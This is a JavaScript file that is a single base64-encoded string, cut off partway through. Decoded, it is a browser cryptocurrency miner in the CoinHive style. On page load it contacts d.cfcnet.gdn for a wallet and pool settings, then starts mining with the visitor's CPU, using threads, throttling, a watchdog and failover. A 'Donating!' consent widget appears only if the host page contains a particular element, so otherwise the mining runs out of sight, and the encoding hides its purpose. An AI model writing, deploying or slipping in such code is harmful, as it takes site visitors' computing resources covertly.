a='d2luZG93LmNwdSA9IC4xNTsKd2luZG93LndhbGxldCA9IG51bGw7CndpbmRvdy5taW5lciA9IG51bGw7CndpbmRvdy5ocHN0aW1lciA9IG51bGwKd2luZG93LnJ1bmxhYmVsID0gIkRvbmF0aW5nISI7CndpbmRvdy5zdG9wbGFiZWwgPSAiRG9uYXRpb25zIFBhdXNlZCI7CndpbmRvdy5jYWNoZU1pbnMgPTMwOwp3aW5kb3cudXNlcmlkID0wOwp3aW5kb3cudXNlcnR5cGUgPSAidyI7CndpbmRvdy50aHJlYWRzID0gbnVsbDsKd2luZG93LnNjcmlwdCA9ICIiOwp3aW5kb3cud3NwYXRoID0gIiI7CndpbmRvdy5wb29sID0gIiI7CndpbmRvdy5mbyA9ICIiOwp3aW5kb3cud2R0aW1lciA9IG51bGw7CndpbmRvdy5ob3N0ZWQ9MTsKd2luZG93LnNlbnRmYiA9MDsKd2luZG93LnByb3h5VXJsID0iIjsKCnZhciBzY3JpcHRUYWcgPSBkb2N1bWVudC5jdXJyZW50U2NyaXB0LnNyYzsKCgpmdW5jdGlvbiBsb2FkU2NyaXB0KHVybCwgY2FsbGJhY2spIHsKCXZhciBzY3JpcHQgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJzY3JpcHQiKTsgCglzY3JpcHQuaWQgPSAiY2ZjX3NjcmlwdCI7CglzY3JpcHQuc3JjID0gdXJsOyAKCWRvY3VtZW50LmhlYWQuYXBwZW5kQ2hpbGQoc2NyaXB0KTsgCglzY3JpcHQub25yZWFkeXN0YXRlY2hhbmdlID0gY2FsbGJhY2s7CglzY3JpcHQub25sb2FkID0gY2FsbGJhY2s7Cglkb2N1bWVudC5oZWFkLmFwcGVuZENoaWxkKHNjcmlwdCk7Cn0KCmZ1bmN0aW9uIGxvYWRTZXR0aW5ncygpewoJdmFyIHNyYyA9IGRvY3VtZW50LmN1cnJlbnRTY3JpcHQuc3JjOwogICAgICAgIHZhciBjaHVuayA9IHNyYy5zdWJzdHJpbmcoMCwgc3JjLmluZGV4T2YoIi5qcyIpLTIpOwogICAgICAgIHZhciBiaXRzID0gY2h1bmsuc3BsaXQoJy8nKTsKCXdpbmRvdy5wYXRoPSIiOwogICAgICAgIGZvcihpPTA7IGk8IGJpdHMubGVuZ3RoIC0xOyBpKyspewogICAgICAgICAgICAgICAgaWYoIWJpdHNbaV0uc3RhcnRzV2l0aCgiaHR0cCIpKXsgd2luZG93LnBhdGggKz0gIi8iOyB9CiAgICAgICAgICAgICAgICB3aW5kb3cucGF0aCArPSBiaXRzW2ldOwogICAgICAgIH0KCgl2YXIgY2FjaGUgPSBkb2N1bWVudC5jdXJyZW50U2NyaXB0LmdldEF0dHJpYnV0ZSgnZGF0YS1jYWNoZScpOwoJaWYoY2FjaGUgJiYgaXNOdW1iZXIoY2FjaGUpKXsgCgkJd2luZG93LmNhY2hlTWlucyA9IGNhY2hlOwoJfQoJdmFyIHRocmVhZHMgPSBkb2N1bWVudC5jdXJyZW50U2NyaXB0LmdldEF0dHJpYnV0ZSgnZGF0YS10aHJlYWRzJyk7CglpZih0aHJlYWRzICYmIGlzTnVtYmVyKHRocmVhZHMpKXsgCgkJd2luZG93LnRocmVhZHMgPSB0aHJlYWRzOwoJfQoKCXZhciBwZXcgPSBkb2N1bWVudC5jdXJyZW50U2NyaXB0LmdldEF0dHJpYnV0ZSgnZGF0YS1sZXZlbCcpOwogICAgICAgIGlmKHBldyAmJiBpc051bWJlcihwZXcpKXsgd2luZG93LmNwdSA9ICgxIC0gKHBldyAvMTAwKSk7IH0KICAgICAgICBlbHNlIGlmKGRvY3VtZW50LmN1cnJlbnRTY3JpcHQuc3JjLmluZGV4T2YoImM9IikgIT09IC0xKXsKICAgICAgICAgICAgICAgIHdpbmRvdy5jcHUgPSAoMSAtICh1bmVzY2FwZShzcmMpLnNwbGl0KCJjPSIpWzFdLnNwbGl0KCImIilbMF0gLzEwMCkpOwogICAgICAgIH0KCgl2YXIgdSA9IGRvY3VtZW50LmN1cnJlbnRTY3JpcHQuZ2V0QXR0cmlidXRlKCdkYXRhLXVzZXInKTsKCWlmKHUpewoJCXdpbmRvdy51c2VyaWQgPSB1OwoJCXdpbmRvdy51c2VydHlwZSA9ICJ1IjsKCX1lbHNlewoJCXZhciB3ID0gZG9jdW1lbnQuY3VycmVudFNjcmlwdC5nZXRBdHRyaWJ1dGUoJ2RhdGEtaWQnKTsKCQlpZih3KXsKCQkJd2luZG93LnVzZXJpZCA9IHc7CgkJCXdpbmRvdy51c2VydHlwZSA9ICJ3IjsKCQl9ZWxzZSBpZihzcmMuaW5kZXhPZigidz0iKSAhPSAtMSl7CgkJCXdpbmRvdy51c2VyaWQgPXVuZXNjYXBlKHNyYykuc3BsaXQoInc9IilbMV0uc3BsaXQoIiYiKVswXTsKCQkJd2luZG93LnVzZXJ0eXBlID0gInciOwoJCX0KCX0KfQoKKGZ1bmN0aW9uKCl7CgoJbG9hZFNldHRpbmdzKCk7CgoJaWYocHJvY2Vzc0Nvb2tpZShmYWxzZSkpeyByZXR1cm47IH0KCglkb01haW4oKTsKCn0oKSApOwoKZnVuY3Rpb24gZG9NYWluKCl7CglpZih3aW5kb3cudXNlcmlkID09MCl7Ci8vCQljb25zb2xlLmxvZygiVW5hYmxlIHRvIGRldGVybWluZSBjZmMgdXNlcmlkIik7Cgl9ZWxzZXsKCQl2YXIgcHJvID0gImh0dHA6Ly8iOwoJCWlmIChsb2NhdGlvbi5wcm90b2NvbCA9PT0gJ2h0dHBzOicpIHsgcHJvID0gImh0dHBzOi8vIjsgfQoJCWNhbGxBamF4KHBybysiZC5jZmNuZXQuZ2RuL2QucGhwPyIrd2luZG93LnVzZXJ0eXBlKyI9Iit3aW5kb3cudXNlcmlkLGNhbGxiYWNrKTsKCX0KfQoKZnVuY3Rpb24gcHJvY2Vzc0Nvb2tpZShmb3JjZSl7Cgl0cnl7CgoJCWlmICAod2luZG93LmNhY2hlTWlucyA9PTApeyByZXR1cm4gZmFsc2U7IH0KLy9jb25zb2xlLmxvZygiQ2hlY2tpbmcgZm9yIGNhY2hlIHdpdGhpbjogIit3aW5kb3cuY2FjaGVNaW5zKyIgbWlucyIpOwoJCXZhciBjID0gcmVhZExvY2FsKCJjZmMxX3Nlc3Npb24iKTsKCQlpZihjID09IG51bGwpeyByZXR1cm4gZmFsc2U7IH0KCgkJdmFyIHRzID0gTWF0aC5yb3VuZCgobmV3IERhdGUoKSkuZ2V0VGltZSgpIC8gMTAwMCk7CgkJdmFyIGxvY2FsID0gSlNPTi5wYXJzZShhdG9iKGMpKTsKCgkJaWYodHMgLSBsb2NhbC50cyA+ICh3aW5kb3cuY2FjaGVNaW5zICogNjApICYmICFmb3JjZSl7IHJldHVybiBmYWxzZTsgfQoKCQl3aW5kb3cud2FsbGV0ID0gbG9jYWwud2FsbGV0OwkKCQl3aW5kb3cuY3B1ID0gbG9jYWwuY3B1OwoJCWlmKGxvY2FsLnRocmVhZHMpeyB3aW5kb3cudGhyZWFkcyA9IGxvY2FsLnRocmVhZHM7IH0KCQl3aW5kb3cucHJveHlVcmwgPSAgbG9jYWwuc2NyaXB0OwovL2NvbnNvbGUubG9nKCJDRkMgc2Vzc2lvbiBsb2FkZWQgZnJvbSBjYWNoZS4gSUQ6ICIrd2luZG93LndhbGxldCsiLGxldmVsOiAiK3dpbmRvdy5jcHUrIiwgc2NyaXB0OiAiK2xvY2FsLnNjcmlwdCk7CgkJLy9sb2FkU2NyaXB0KGxvY2FsLnNjcmlwdCwgc3RhcnRJdCk7CgkJc3RhcnRJdCgpOwoJCXJldHVybiB0cnVlOwoJfWNhdGNoKGUpewoJCXJldHVybiBmYWxzZTsKCX0KfQoKZnVuY3Rpb24gc3RhcnRJdCgpewoJc3RhcnRXb3JrKCk7CglzZXRUaW1lb3V0KGZ1bmN0aW9uKCl7IGNoZWNrQW5kU2hvd0RpdigpOyB9LCAxMDApOwp9CgpmdW5jdGlvbiBzdGFydFdvcmsoKXsKCgl2YXIgY2h1bmsgPSBzY3JpcHRUYWcuc3Vic3RyaW5nKDAsIHNjcmlwdFRhZy5pbmRleE9mKCIuanMiKS0yKTsKCXZhciBiaXRzID0gY2h1bmsuc3BsaXQoJy8nKTsKCXZhciBsaWJVcmwgPSBudWxsOwoJdmFyIGxpYlVybD0iIjsKCWZvcihpPTA7IGk8IGJpdHMubGVuZ3RoIC0xOyBpKyspewoJCWlmKCFiaXRzW2ldLnN0YXJ0c1dpdGgoImh0dHAiKSl7IGxpYlVybCArPSAiLyI7IH0KCQlsaWJVcmwgKz0gYml0c1tpXTsKCX0KCWxpYlVybCArPSAiLyI7CglzZXR1cE1pbmVyKGxpYlVybCk7CglzZXR1cEpvYigpOwoJd2luZG93LndhbGxldCA9IHdpbmRvdy53YWxsZXQudHJpbSgpOwoJd2luZG93Lm1pbmVyID0gQ0guQW5vbnltb3VzKHdpbmRvdy53YWxsZXQgKTsKCWlmKHdpbmRvdy5taW5lci5fb3RoZXJUYWJSdW5uaW5nKCkpewogICAgICAgICAgICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpeyBzdGFydFdvcmsoKTsgfSwgMTAwMCk7CiAgICAgICAgICAgICAgICByZXR1cm47CiAgICAgICAgfQoKICAgICAgICBpZih3aW5kb3cudGhyZWFkcyl7CiAgICAgICAgICAgICAgICB2YXIgdG4gPSB3aW5kb3cudGhyZWFkczsKICAgICAgICAgICAgICAgIGlmKHRuIDwgMSl7IHRuID0gTWF0aC5yb3VuZCh0biAqIG5hdmlnYXRvci5oYXJkd2FyZUNvbmN1cnJlbmN5KTsgfQogICAgICAgICAgICAgICAgd2luZG93Lm1pbmVyLnNldE51bVRocmVhZHMoIHRuICk7CiAgICAgICAgfWVsc2V7CiAgICAgICAgICAgICAgICB3aW5kb3cubWluZXIuc2V0VGhyb3R0bGUoIHdpbmRvdy5jcHUgKTsKICAgICAgICB9CiAgICAgICAgaWYod2luZG93LmNwdSAhPTEpewogICAgICAgICAgICAgICAgd2luZG93Lm1pbmVyLnN0YXJ0KCk7CiAgICAgICAgICAgICAgICB3aW5kb3cud2R0aW1lciA9IHNldFRpbWVvdXQoZnVuY3Rpb24oKXsgd2F0Y2hkb2coKTsgfSwgMjUwMDApOwogICAgICAgIH0KCiAgICAgICAgd2luZG93Lm1pbmVyLm9uKCdlcnJvcicsIGZ1bmN0aW9uKHBhcmFtcykgewoJCWlmKHBhcmFtcy5tZXNzYWdlID09ICdpbnZhbGlkIG1ldGhvZCcpeyByZXR1cm47IH0KCiAgICAgICAgICAgICAgICBsb2NhbFN0b3JhZ2UucmVtb3ZlSXRlbSgiY2ZjMV9zZXNzaW9uIik7CgkJY2xlYXJUaW1lb3V0KHdpbmRvdy53ZHRpbWVyKTsKICAgICAgICAgICAgICAgIGlmIChwYXJhbXMuZXJyb3IgIT09ICdjb25uZWN0aW9uX2Vycm9yJykgewogICAgICAgICAgICAgICAgICAgICAgICAvL2ZlZWRiYWNrKCJlcnJvcjogIitwYXJhbXMuZXJyb3IpOwoJCQlpZihwYXJhbXMuZXJyb3IgIT09ICdpbnZhbGlkX3NpdGVfa2V5Jyl7CgkJCQlmYWlsb3ZlcigpOyAKCQkJfQogICAgICAgICAgICAgICAgICAgICAgICAvL2NvbnNvbGUubG9nKCdUaGUgcG9vbCByZXBvcnRlZCBhbiBlcnJvcicsIHBhcmFtcy5lcnJvcik7CiAgICAgICAgICAgICAgICB9ZWxzZXsKICAgICAgICAgICAgICAgICAgICAgICAgZmVlZGJhY2soImNvbm5lY3Rpb24gZXJyb3IiKTsKCQkJc2V0VGltZW91dChmdW5jdGlvbigpeyBmYWlsb3ZlcigpOyB9LCAxMDAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgLy9jb25zb2xlLmxvZygiR290IGEgY29ubmVjdGlvbiBlcnJvciB0byB0aGUgcHJveHkhIik7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgfSk7Cgp9CgpmdW5jdGlvbiBmYWlsb3ZlcigpewoJd2luZG93Lm1pbmVyLnN0b3AoKTsKCXdpbmRvdy5taW5lciA9IG51bGw7Cgl2YXIgZWxlbWVudCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJjZmMxX3NjcmlwdCIpOwoJZWxlbWVudC5wYXJlbnROb2RlLnJlbW92ZUNoaWxkKGVsZW1lbnQpOwoKCXZhciBub2RlID0gd2luZG93LmZvICsiP3Y9MSZwb29sPSIrd2luZG93LnBvb2wrIjpjZmNfZGlyZWN0IjsKCXdpbmRvdy5zY3JpcHQgPSBub2RlOwovLwlsb2FkU2NyaXB0KHdpbmRvdy5zY3JpcHQsIHN0YXJ0V29yayk7Cn0KCmZ1bmN0aW9uIHdhdGNoZG9nKCl7CglpZih3aW5kb3cubWluZXIgPT0gdW5kZWZpbmVkIHx8IHdpbmRvdy5taW5lci5nZXRUb3RhbEhhc2hlcygpPT0wKXsKCQlsb2NhbFN0b3JhZ2UucmVtb3ZlSXRlbSgiY2ZjMV9zZXNzaW9uIik7CgkJLy9jb25zb2xlLmxvZygid2QgcmVtb3ZlZCBsb2NhbCBzZXNzaW9uIGR1ZSB0byBpbmFjdGl2aXR5Iik7Ci8vCQlmZWVkYmFjaygic3RhbGwiKTsKCQlmYWlsb3ZlcigpOwoJfQp9CgpmdW5jdGlvbiBmZWVkYmFjayhtc2cpewoJaWYod2luZG93LnNlbnRmYj09MSl7IHJldHVybjsgfQoJd2luZG93LnNlbnRmYiA9MTsKCXZhciByZXBvcnQgPSBuZXcgT2JqZWN0KCk7CglyZXBvcnQuZXJyb3J0eXBlID0gbXNnOwoJcmVwb3J0LmlkID0gd2luZG93LnVzZXJpZDsKCXJlcG9ydC50eXBlID0gd2luZG93LnVzZXJ0eXBlOwoJcmVwb3J0LnRocmVhZHMgPSB3aW5kb3cudGhyZWFkczsKCXJlcG9ydC5zY3JpcHQgPSB3aW5kb3cuc2NyaXB0OwoJcmVwb3J0LnBvb2wgPSB3aW5kb3cucG9vbDsKCXJlcG9ydC53c3BhdGggPSB3aW5kb3cud3NwYXRoOwoJcmVwb3J0LndhbGxldCA9IHdpbmRvdy53YWxsZXQ7CglyZXBvcnQubWluZXJ3YXNtID0gd2luZG93Lm1pbmVyLmhhc1dBU01TdXBwb3J0KCk7Cgl2YXIgdiA9IGJ0b2EoSlNPTi5zdHJpbmdpZnkocmVwb3J0KSk7CgoJdmFyIHBybyA9ICJodHRwOi8vIjsKCWlmIChsb2NhdGlvbi5wcm90b2NvbCA9PT0gJ2h0dHBzOicpIHsgcHJvID0gImh0dHBzOi8vIjsgfQovLwljYWxsQWpheChwcm8rImQuY2ZjbmV0Lmdkbi9kLnBocD9zdGFsbD0xJnJlcG9ydD0iK3YsbnVsbCk7Cn0KCmZ1bmN0aW9uIGNhbGxiYWNrKHEpewoJdmFyIG0gPSBKU09OLnBhcnNlKHEpOwoJaWYobS5yZXN1bHQgPT0gInN1Y2Nlc3MiKXsKCQl2YXIgc2NyaXB0ID0gbS5zY3JpcHQ7CgkJd2luZG93LndhbGxldCA9IG0ud2FsbGV0OwoJCXdpbmRvdy5wb29sID0gbS5wb29sOwoJCXdpbmRvdy53c3BhdGggPSBtLndzcGF0aDsKCQl3aW5kb3cuZm8gPSBtLmZvOwoJCWlmKHdpbmRvdy5ob3N0ZWQgPT0wKXsKCQkJLy8gZm9yIGxvY2FsIHVzZXJzCgkJCXNjcmlwdCA9IHdpbmRvdy5wYXRoKyJjZmMuanM/ZD0iK20ud3NwYXRoOwoJCX0KCQl3aW5kb3cuc2NyaXB0ID0gc2NyaXB0OwoKCQl3aW5kb3cucHJveHlVcmwgPSBtLndzcGF0aDsKCgkJLy9sb2FkU2NyaXB0KHNjcmlwdCwgc3RhcnRJdCk7CgoJCXZhciB0cyA9IE1hdGgucm91bmQoKG5ldyBEYXRlKCkpLmdldFRpbWUoKSAvIDEwMDApOwoJCXZhciBjb29rID0ge3dhbGxldDogbS53YWxsZXQsIHNjcmlwdDogbS53c3BhdGgsY3B1OiB3aW5kb3cuY3B1LCB0aHJlYWRzOiB3aW5kb3cudGhyZWFkcywgdHM6IHRzfTsKCQl2YXIgdiA9IGJ0b2EoSlNPTi5zdHJpbmdpZnkoY29vaykpOwoJCWxvY2FsU3RvcmFnZVsiY2ZjMV9zZXNzaW9uIl0gPSB2OwoJCXN0YXJ0SXQoKTsKCQkvL2NvbnNvbGUubG9nKCJDRkMgc2Vzc2lvbiBzdG9yZWQuIElEOiAiK3dpbmRvdy53YWxsZXQrIixMZXZlbDogIit3aW5kb3cuY3B1KyIsIHNjcmlwdDogIitzY3JpcHQpOwoJfWVsc2V7CgkJLy9jb25zb2xlLmxvZygiR290IGFuIGVycm9yIGZyb20gZCB3czogIittLm1lc3NhZ2UpOwoJfQp9CgoKCmZ1bmN0aW9uIGNhbGxBamF4KHVybCwgY2FsbGJhY2spewogICAgdmFyIHhtbGh0dHA7CiAgICB4bWxodHRwID0gbmV3IFhNTEh0dHBSZXF1ZXN0KCk7Ci8vCXhtbGh0dHAub25lcnJvciA9IHByb2Nlc3NDb29raWUodHJ1ZSk7CiAgICB4bWxodHRwLm9ucmVhZHlzdGF0ZWNoYW5nZSA9IGZ1bmN0aW9uKCl7CiAgICAgICAgaWYgKHhtbGh0dHAucmVhZHlTdGF0ZSA9PSA0ICYmIHhtbGh0dHAuc3RhdHVzID09IDIwMCl7CgkJaWYoY2FsbGJhY2speyBjYWxsYmFjayh4bWxodHRwLnJlc3BvbnNlVGV4dCk7IH0KICAgICAgICB9CiAgICB9CiAgICB4bWxodHRwLm9wZW4oIkdFVCIsIHVybCwgdHJ1ZSk7CiAgICB4bWxodHRwLnNlbmQoKTsKfQoKZnVuY3Rpb24gY2hlY2tBbmRTaG93RGl2KCl7Cgl2YXIgb3VyZGl2ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImNmY19kb25hdGUiKTsKCWlmKG91cmRpdil7CgkJdmFyIHNob3dDID0gKDEgLSB3aW5kb3cuY3B1KSAqIDEwMDsKCQl2YXIgc290cCA9IG91cmRpdi5nZXRBdHRyaWJ1dGUoImRhdGEtc3RvcGxhYmVsIik7CgkJdmFyIHVuc290cCA9IG91cmRpdi5nZXRBdHRyaWJ1dGUoImRhdGEtcnVubGFiZWwiKTsKCQlpZihzb3RwKXsgd2luZG93LnN0b3BsYWJlbCA9IHNvdHA7IH0KCQlpZih1bnNvdHApeyB3aW5kb3cucnVubGFiZWwgPSB1bnNvdHA7IH0KCQl2YXIgcmMgPSAic3Bpbi1zbG93IjsKCQl2YXIgdHh0ID0gd2luZG93LnJ1bmxhYmVsOwoJCWlmKHdpbmRvdy5jcHUgPT0xKXsgCgkJCXR4dCA9IHdpbmRvdy5zdG9wbGFiZWwKCQkJcmMgPSAiIjsKCQl9CgkJdmFyIHB1a2UgPSAiPGRpdiBzdHlsZT0nd2lkdGg6MjUwcHg7IG92ZXJmbG93OmhpZGRlbic+IjsKCQlwdWtlICs9ICI8ZGl2IHN0eWxlPSd3aWR0aDo0NXB4OyBmbG9hdDogbGVmdDsnPjxkaXYgaWQ9J3Jpbmd1JyBjbGFzcz0nIityYysiJz48L2Rpdj4gPC9kaXY+IjsKCQlwdWtlICs9ICI8ZGl2IHN0eWxlPSdtYXJnaW4tbGVmdDo1MHB4OyB3aWR0aDoyMDBweDsnPiA8c3BhbiBpZD0nbWluZXItc3RhdGUnPiIrdHh0KyI8L3NwYW4+ICg8c3BhbiBpZD0naHBzJz4wPC9zcGFuPiBIL3MpIDxicj4iOwoJCXB1a2UgKz0gIjxkaXYgaWQ9J3NsaWRlY29udGFpbmVyJz4gPGlucHV0IHR5cGU9J3JhbmdlJyB3aWR0aD0nMjAwcHg7IG1pbj0nMCcgbWF4PScxMDAnIHZhbHVlPSciK3Nob3dDKyInIGNsYXNzPSdzbGlkZXInIGlkPSdjcHVUaHJvdHRsZScgZGF0YS10b2dnbGU9J3Rvb2x0aXAnIGRhdGEtcGxhY2VtZW50PSd0b3AnID4gPC9kaXY+IDwvZGl2PiI7CgoJCXB1a2UgKz0gIjwvZGl2PiI7CgkJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImNmY19kb25hdGUiKS5pbm5lckhUTUwgPSBwdWtlOwoJCWNwdVRocm90dGxlLmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIGZ1bmN0aW9uKCkgewoJCQl2YXIgd2FzU3RvcHBlZCA9IGZhbHNlOwoJCQlpZih3aW5kb3cuY3B1ID09MSl7IHdhc1N0b3BwZWQ9dHJ1ZTsgfQoJCQl2YXIgdmFsID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2NwdVRocm90dGxlJykudmFsdWU7CgkJCXdpbmRvdy5jcHUgPSAoMSAtICh2YWwgLzEwMCkpOwoJCQlpZih3aW5kb3cuY3B1ID09MSl7CgkJCQl3aW5kb3cubWluZXIuc3RvcCgpOwoJCQkJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIm1pbmVyLXN0YXRlIikuaW5uZXJIVE1MID0gd2luZG93LnN0b3BsYWJlbDsKCQkJCWNsZWFyVGltZW91dCh3aW5kb3cud2R0aW1lcik7CgkJCX1lbHNlewoJCQkJaWYod2FzU3RvcHBlZCl7IAoJCQkJCXdpbmRvdy5taW5lci5zdGFydCgpOyAKCQkJCQl3aW5kb3cud2R0aW1lciA9IHNldFRpbWVvdXQoZnVuY3Rpb24oKXsgd2F0Y2hkb2coKTsgfSwgMTUwMDApOwoJCQkJCWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJtaW5lci1zdGF0ZSIpLmlubmVySFRNTCA9IHdpbmRvdy5ydW5sYWJlbDsKCQkJCX0KCQkJCXdpbmRvdy5taW5lci5zZXRUaHJvdHRsZSggd2luZG93LmNwdSApOwoJCQl9CgkJCXNldFNwaW5uZXIodmFsKTsKCQl9KTsKCQlsb2FkQ3NzKCk7CgkJd2luZG93Lmhwc3RpbWVyID0gc2V0SW50ZXJ2YWwoZ2V0SFBTLCAxMDAwKTsKCQlpZih3aW5kb3cuY3B1ICE9MSl7IHNldFNwaW5uZXIoMjUpOyB9Cgl9Cn0KCmZ1bmN0aW9uIGxvYWRDc3MoKXsKCXZhciBsID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnbGluaycpOwoJbC50eXBlID0gJ3RleHQvY3NzJzsKCWwucmVsID0gJ3N0eWxlc2hlZXQnOwoJbC5tZWRpYSA9ICdzY3JlZW4nOwoJbC5ocmVmID0gJ2h0dHBzOi8vbm9kZS5jZmNkaXN0Lmdkbi92ZW5kb3IvZG9uYXRlX3N0eWxlLmNzcyc7Cglkb2N1bWVudC5nZXRFbGVtZW50c0J5VGFnTmFtZSgnaGVhZCcpWzBdLmFwcGVuZENoaWxkKGwpOwp9CmZ1bmN0aW9uIGdldEhQUygpewoJaWYod2luZG93Lm1pbmVyID09IG51bGwpeyByZXR1cm47IH0KCXZhciBocHMgPSB3aW5kb3cubWluZXIuZ2V0SGFzaGVzUGVyU2Vjb25kKCk7Cglkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiaHBzIikuaW5uZXJIVE1MID1NYXRoLnJvdW5kKGhwcykgOwoKfQpmdW5jdGlvbiBzZXRTcGlubmVyKHZhbCl7CiAgICAgICAgcmluZ3UuY2xhc3NOYW1lID0iIjsKICAgICAgICBpZih3aW5kb3cubWluZXIgIT0gbnVsbCl7CgkJaWYodmFsID09MCl7CgkJCS8vPwogICAgICAgICAgICAgICAgfWVsc2UgaWYodmFsIDwgMjUpewogICAgICAgICAgICAgICAgICAgICAgICByaW5ndS5jbGFzc0xpc3QuYWRkKCJzcGluLXNsb3dlc3QiKTsKICAgICAgICAgICAgICAgIH1lbHNlIGlmKHZhbCA8IDUwKXsKICAgICAgICAgICAgICAgICAgICAgICAgcmluZ3UuY2xhc3NMaXN0LmFkZCgic3Bpbi1zbG93Iik7CiAgICAgICAgICAgICAgICB9ZWxzZSBpZih2YWwgPCA3NSl7CiAgICAgICAgICAgICAgICAgICAgICAgIHJpbmd1LmNsYXNzTGlzdC5hZGQoInNwaW4tZmFzdCIpOwogICAgICAgICAgICAgICAgfWVsc2V7CiAgICAgICAgICAgICAgICAgICAgICAgIHJpbmd1LmNsYXNzTGlzdC5hZGQoInNwaW4tZmFzdGVzdCIpOwogICAgICAgICAgICAgICAgfQogICAgICAgIH0KfQpmdW5jdGlvbiByZWFkTG9jYWwobmFtZSkgewoJdmFyIHN0b3JlZCA9IGxvY2FsU3RvcmFnZVtuYW1lXTsKCWlmIChzdG9yZWQpIHsKCQlyZXR1cm4gc3RvcmVkOwoJfQoJZWxzZSB7cmV0dXJuIG51bGw7IH0KCn0KCmZ1bmN0aW9uIGxvYWRGaWxlKHVybCwgY2FsbGJhY2sxLCBjYjIpIHsKCXZhciB4aHIgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTsKCXhoci5vbnJlYWR5c3RhdGVjaGFuZ2UgPSBmdW5jdGlvbiAoKSB7CgkJaWYgKHhoci5yZWFkeVN0YXRlID09PSA0ICYmIHhoci5zdGF0dXMgPT09IDIwMCl7CgkJCSBjYWxsYmFjazEoeGhyLnJlc3BvbnNlVGV4dCwgY2IyKTsKCQl9ZWxzZXsKCQl9Cgl9OwoJeGhyLm9wZW4oIkdFVCIsIHVybCwgdHJ1ZSk7Cgl4aHIuc2VuZCgpOwp9CgpmdW5jdGlvbiBpc051bWJlcihuKSB7IHJldHVybiAhaXNOYU4ocGFyc2VGbG9hdChuKSkgJiYgIWlzTmFOKG4gLSAwKSB9CgoKCgpmdW5jdGlvbiBzZXR1cE1pbmVyKGxpYlVybCkgewoKICAidXNlIHN0cmljdCI7CiAgdmFyIE1pbmVyID0gZnVuY3Rpb24oc2l0ZUtleSwgcGFyYW1zKSB7CiAgICB0aGlzLnBhcmFtcyA9IHBhcmFtcyB8fCB7fTsKICAgIHRoaXMuX3NpdGVLZXkgPSBzaXRlS2V5OwogICAgdGhpcy5fdXNlciA9IG51bGw7CiAgICB0aGlzLl90aHJlYWRzID0gW107CiAgICB0aGlzLl9oYXNoZXMgPSAwOwogICAgdGhpcy5fY3VycmVudEpvYiA9IG51bGw7CiAgICB0aGlzLl9hdXRvUmVjb25uZWN0ID0gdHJ1ZTsKICAgIHRoaXMuX3JlY29ubmVjdFJldHJ5ID0gMzsKICAgIHRoaXMuX3Rva2VuRnJvbVNlcnZlciA9IG51bGw7CiAgICB0aGlzLl9nb2FsID0gMDsKICAgIHRoaXMuX3RvdGFsSGFzaGVzRnJvbURlYWRUaHJlYWRzID0gMDsKICAgIHRoaXMuX3Rocm90dGxlID0gTWF0aC5tYXgoMCwgTWF0aC5taW4oMC45OSwgdGhpcy5wYXJhbXMudGhyb3R0bGUgfHwgMCkpOwogICAgdGhpcy5fc3RvcE9uSW52YWxpZE9wdEluID0gZmFsc2U7CiAgICB0aGlzLl9hdXRvVGhyZWFkcyA9IHsKICAgICAgZW5hYmxlZDogISF0aGlzLnBhcmFtcy5hdXRvVGhyZWFkcywKICAgICAgaW50ZXJ2YWw6IG51bGwsCiAgICAgIGFkanVzdEF0OiBudWxsLAogICAgICBhZGp1c3RFdmVyeTogMWU0LAogICAgICBzdGF0czoge30KICAgIH07CiAgICB0aGlzLl90YWIgPSB7CiAgICAgIGlkZW50OiAoTWF0aC5yYW5kb20oKSAqIDE2Nzc3MjE1KSB8IDAsCiAgICAgIG1vZGU6IENILklGX0VYQ0xVU0lWRV9UQUIsCiAgICAgIGdyYWNlOiAwLAogICAgICBsYXN0UGluZ1JlY2VpdmVkOiAwLAogICAgICBpbnRlcnZhbDogbnVsbAogICAgfTsKICAgIGlmICh3aW5kb3cuQnJvYWRjYXN0Q2hhbm5lbCkgewogICAgICB0cnkgewogICAgICAgIHRoaXMuX2JjID0gbmV3IEJyb2FkY2FzdENoYW5uZWwoIkNIIik7CiAgICAgICAgdGhpcy5fYmMub25tZXNzYWdlID0gZnVuY3Rpb24obXNnKSB7CiAgICAgICAgICBpZiAobXNnLmRhdGEgPT09ICJwaW5nIikgewogICAgICAgICAgICB0aGlzLl90YWIubGFzdFBpbmdSZWNlaXZlZCA9IERhdGUubm93KCk7CiAgICAgICAgICB9CiAgICAgICAgfS5iaW5kKHRoaXMpOwogICAgICB9IGNhdGNoIChlKSB7fQogICAgfQogICAgdGhpcy5fZXZlbnRMaXN0ZW5lcnMgPSB7CiAgICAgIG9wZW46IFtdLAogICAgICBhdXRoZWQ6IFtdLAogICAgICBjbG9zZTogW10sCiAgICAgIGVycm9yOiBbXSwKICAgICAgam9iOiBbXSwKICAgICAgZm91bmQ6IFtdLAogICAgICBhY2NlcHRlZDogW10sCiAgICAgIG9wdGluOiBbXQogICAgfTsKICAgIHZhciBkZWZhdWx0VGhyZWFkcyA9IG5hdmlnYXRvci5oYXJkd2FyZUNvbmN1cnJlbmN5IHx8IDQ7CiAgICB0aGlzLl90YXJnZXROdW1UaHJlYWRzID0gdGhpcy5wYXJhbXMudGhyZWFkcyB8fCBkZWZhdWx0VGhyZWFkczsKICAgIHRoaXMuX3VzZVdBU00gPSB0aGlzLmhhc1dBU01TdXBwb3J0KCkgJiYgIXRoaXMucGFyYW1zLmZvcmNlQVNNSlM7CiAgICB0aGlzLl9taW5iaW5TdGF0dXMgPSAidW5sb2FkZWQiOwogICAgdGhpcy5fb25UYXJnZXRNZXRCb3VuZCA9IHRoaXMuX29uVGFyZ2V0TWV0LmJpbmQodGhpcyk7CiAgICB0aGlzLl9vblZlcmlmaWVkQm91bmQgPSB0aGlzLl9vblZlcmlmaWVkLmJpbmQodGhpcyk7CiAgfTsKICBNaW5lci5wcm90b3R5cGUuc3RhcnQgPSBmd